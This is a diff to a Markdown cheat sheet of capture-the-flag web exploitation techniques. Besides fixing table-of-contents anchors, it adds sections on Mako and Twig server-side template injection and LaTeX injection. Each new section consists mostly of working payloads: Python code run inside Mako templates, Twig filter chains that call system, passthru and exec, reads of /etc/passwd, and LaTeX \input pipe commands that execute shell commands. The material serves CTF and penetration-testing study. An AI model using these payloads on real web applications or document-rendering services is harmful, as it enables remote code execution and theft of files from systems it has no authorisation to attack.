@@ -8,7 +8,7 @@
   - [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
   - [Second-Order SQL Injection](#second-order-sql-injection)
   - [SQLi LIKE Character Brute-Force](#sqli-like-character-brute-force)
-  - [SQLi → SSTI Chain](#sqli-ssti-chain)
+  - [SQLi → SSTI Chain](#sqli--ssti-chain)
   - [MySQL information_schema.processList Trick](#mysql-information_schemaprocesslist-trick)
   - [WAF Bypass via XML Entity Encoding (Crypto-Cat)](#waf-bypass-via-xml-entity-encoding-crypto-cat)
 - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
@@ -16,6 +16,8 @@
   - [Go Template Injection](#go-template-injection)
   - [EJS Server-Side Template Injection](#ejs-server-side-template-injection)
   - [ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)](#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)
+  - [Mako SSTI](#mako-ssti)
+  - [Twig SSTI](#twig-ssti)
 - [SSRF](#ssrf)
   - [Host Header SSRF (MireaCTF)](#host-header-ssrf-mireactf)
   - [DNS Rebinding for TOCTOU](#dns-rebinding-for-toctou)
@@ -31,16 +33,17 @@
   - [Bypassing Keyword Blocklists](#bypassing-keyword-blocklists)
   - [Exfiltration](#exfiltration)
 - [Perl open() RCE](#perl-open-rce)
+- [LaTeX Injection RCE (Hack.lu CTF 2012)](#latex-injection-rce-hacklu-ctf-2012)
 - [Server-Side JS eval Blocklist Bypass](#server-side-js-eval-blocklist-bypass)
 - [ReDoS as Timing Oracle](#redos-as-timing-oracle)
 - [API Filter/Query Parameter Injection](#api-filterquery-parameter-injection)
 - [HTTP Response Header Data Hiding](#http-response-header-data-hiding)
-- [File Upload → RCE Techniques](#file-upload-rce-techniques)
+- [File Upload → RCE Techniques](#file-upload--rce-techniques)
   - [.htaccess Upload Bypass](#htaccess-upload-bypass)
   - [PHP Log Poisoning](#php-log-poisoning)
   - [Python .so Hijacking (by Siunam)](#python-so-hijacking-by-siunam)
   - [Gogs Symlink RCE (CVE-2025-8110)](#gogs-symlink-rce-cve-2025-8110)
-  - [ZipSlip + SQLi](#zipslip-sqli)
+  - [ZipSlip + SQLi](#zipslip--sqli)
 - [PHP Deserialization from Cookies](#php-deserialization-from-cookies)
 - [WebSocket Mass Assignment](#websocket-mass-assignment)
 - [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
@@ -280,6 +283,44 @@ curl --cookie 'name=<%= Sequel::DATABASES.first[:players].all %>' ...
 
 **Key insight:** Even when ERB sandboxes block `DB` or `DATABASE` constants, `Sequel::DATABASES` is a global array listing all open Sequel connections. It bypasses variable-name-based restrictions. In Sinatra, `<%= ... %>` tags in cookies or parameters that are reflected through ERB templates are common SSTI vectors.
 
+### Mako SSTI
+
+```python
+# Detection
+${7*7}  # Returns 49
+
+# RCE
+<%
+  import os
+  os.popen("id").read()
+%>
+
+# One-liner
+${__import__('os').popen('cat /flag.txt').read()}
+```
+
+**Key insight:** Mako templates (Python) execute Python code directly inside `${}` or `<% %>` blocks — no sandbox, no class traversal needed. Detection identical to Jinja2 (`${7*7}`) but payloads are plain Python.
+
+### Twig SSTI
+
+```twig
+{# Detection #}
+{{7*7}}   {# Returns 49 #}
+{{7*'7'}} {# Returns 7777777 (string repeat = Twig, not Jinja2) #}
+
+{# File read #}
+{{'/etc/passwd'|file_excerpt(1,30)}}
+
+{# RCE (Twig 1.x) #}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+{# RCE (Twig 3.x via filter) #}
+{{['id']|map('system')|join}}
+{{['cat /flag.txt']|map('passthru')|join}}
+```
+
+**Key insight:** Distinguish Twig from Jinja2 via `{{7*'7'}}` — Twig repeats the string (`7777777`), Jinja2 returns `49`. Twig 3.x removed `_self.env` access; use `|map('system')` filter chain instead.
+
 ## SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)
 
 **Pattern (KameHame-Hack):** Jinja2 SSTI where quotes are filtered, preventing string arguments. Use Python keyword arguments to bypass — `__dict__.update(key=value)` requires no quotes.
@@ -415,6 +456,40 @@ Legacy 2-argument `open()` allows command injection:
 open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
 # Exploit: "|command_here" or "command|"
 ```
+
+---
+
+## LaTeX Injection RCE (Hack.lu CTF 2012)
+
+**Pattern:** Web applications that compile user-supplied LaTeX (PDF generation services, scientific paper renderers) allow command execution via `\input` with pipe syntax.
+
+**Read files:**
+```latex
+\begingroup\makeatletter\endlinechar=\m@ne\everyeof{\noexpand}
+\edef\x{\endgroup\def\noexpand\filecontents{\@@input"/etc/passwd" }}\x
+\filecontents
+```
+
+**Execute commands:**
+```latex
+\input{|"id"}
+\input{|"ls /home/"}
+\input{|"cat /flag.txt"}
+```
+
+**Full payload as standalone document:**
+```latex
+\documentclass{article}
+\begin{document}
+{\catcode`_=12 \ttfamily
+\input{|"ls /home/user/"}
+}
+\end{document}
+```
+
+**Key insight:** LaTeX's `\input{|"cmd"}` syntax pipes shell command output directly into the document. The `\@@input` internal macro reads files without shell invocation. Use `\catcode` adjustments to handle special characters (underscores, braces) in command output.
+
+**Detection:** Any endpoint accepting `.tex` input, PDF preview/compile services, or "render LaTeX" functionality.
 
 ---
 
